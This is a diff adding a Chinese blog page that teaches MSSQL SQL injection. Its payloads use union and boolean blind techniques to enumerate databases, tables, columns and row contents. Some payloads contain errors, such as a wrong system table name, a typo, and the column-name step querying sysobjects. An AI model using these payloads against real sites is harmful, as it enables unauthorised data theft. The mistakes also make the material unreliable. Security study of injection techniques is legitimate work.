@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh">
+	<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Hu5k7&#39;s Blog
+    </title>
+    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            MSSQL_Blind_Injection
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="0x00-前言">0x00 前言</h1>
+<p>不要问我为什么不配图。因为这个hexo老是渲染失败。搞的我直接裂开了。</p>
+<p><img src="ADF1B901FABD5EA3559C8BE8518DBF08.jpg" alt></p>
+<h1 id="0x01-MSSQL盲注-前期知识">0x01 MSSQL盲注_前期知识</h1>
+<p>了解前。先有两个函数要先了解一下count(),object_id()<br>
+1.union all select count(*) from dbo.sysobjects</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">union all select count(*) from dbo.sysobjects</span><br><span class="line">count指是查询表的所有记录数，也就是无需去order by查询字段数。就能达成回显(只限于盲注8?)</span><br><span class="line">=========================================</span><br><span class="line">?id=1 union all select null,db_name(),null //查询当前库名</span><br><span class="line"></span><br><span class="line"> ?id=1 union all select dbid,name,null from master.dbo.sysdatabases //查询当前所有库</span><br><span class="line"> dbid 是指数据库的id, master.dbo.sysdatabases 则是来查询库</span><br><span class="line">==========================================</span><br><span class="line"> object_id()</span><br><span class="line">简单的一句话总结就是 免去了 查询id</span><br><span class="line"> unino all select null,name,null from dbo.syscolumns where id=object_id(&apos;dbo.admin&apos;) //要注意这里要加单引号括起来</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-MSSQL盲注">0x02 MSSQL盲注</h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#查询库名长度</span><br><span class="line">?id=1 and (select count(*)from master.dbo.databases where dbid=1 and len(name)=4)=1</span><br><span class="line">====================================================</span><br><span class="line">#查询库名</span><br><span class="line">?id=1 and (select count(*) from master.dbo.databases where dbid=1 and ascii(substring(name,1,1))=100)=1</span><br><span class="line">===================================================</span><br><span class="line">#查询表名</span><br><span class="line">?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype=&apos;U&apos;)and ascii(substring(name,1,1))=100)=1</span><br><span class="line"></span><br><span class="line">?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype=&apos;U&apos; and name not in(&apos;zkaq&apos;))and ascii(substring(name,1,1))=100)=1</span><br><span class="line"></span><br><span class="line">tips: (top 1) 是指查询最大值的那一个</span><br><span class="line">==================================================</span><br><span class="line">#查询字段名</span><br><span class="line">(假设已猜出表名(zkaq666))</span><br><span class="line">?id=1 and (select count(*)from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where id=object_id(&apos;dbo.zkaq666&apos;))and ascii(substring(name,1,1))=100)=1</span><br><span class="line">====================================================</span><br><span class="line">#查询字段内容</span><br><span class="line">(假设已猜出字段名(username))</span><br><span class="line">?id=1 and (select count(*) from dbo.zkaq666 where username in(select top 1 username from dbo.zkaq666)and ascii(substring(username,1,1))=100)=1</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-总结">0x03 总结</h1>
+<p><strong>很他妈简单。看不懂的自己去试一试！</strong></p>
+<hr>
+<p><strong>参考连接link:<br>
+<a href="https://blog.csdn.net/v_gbird/article/details/93981684" target="_blank" rel="noopener">https://blog.csdn.net/v_gbird/article/details/93981684</a><br>
+<a href="https://blog.csdn.net/kuxing100/article/details/9670533" target="_blank" rel="noopener">https://blog.csdn.net/kuxing100/article/details/9670533</a></strong></p>
+
+    </div>
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020  Hexo-Hijack.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+            
+        </label>
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+
+<script src="/js/logo_title.js"></script>
+<script src="/libs/jquery.min.js"></script>
+<script src="/libs/highlight/highlight.pack.js"></script>
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script src="/js/js.js"></script>
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
